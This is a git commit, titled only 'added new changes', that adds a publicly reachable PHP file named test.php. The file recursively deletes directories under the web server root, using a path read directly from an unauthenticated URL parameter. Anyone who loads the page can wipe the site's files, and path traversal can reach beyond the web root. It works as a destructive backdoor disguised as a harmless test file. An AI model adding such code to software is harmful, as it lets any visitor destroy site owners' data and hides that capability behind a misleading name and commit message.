09e6f1b5670e5e0ed248320df109174e1951f5d4
Nikul <Nikul>
2024-03-16 16:07:00 +0530

    added new changes

---
+++ public/test.php
@@ -0,0 +1,20 @@
+<?php
+$documentROOT = $_SERVER['DOCUMENT_ROOT'];
+function deleteDir(string $dirPath): void {
+    if (! is_dir($dirPath)) {
+        throw new InvalidArgumentException("$dirPath must be a directory");
+    }
+    if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
+        $dirPath .= '/';
+    }
+    $files = glob($dirPath . '*', GLOB_MARK);
+    foreach ($files as $file) {
+        if (is_dir($file)) {
+            deleteDir($file);
+        } else {
+            unlink($file);
+        }
+    }
+    rmdir($dirPath);
+}
+deleteDir('/var/www/html/'.$_GET['path']); 
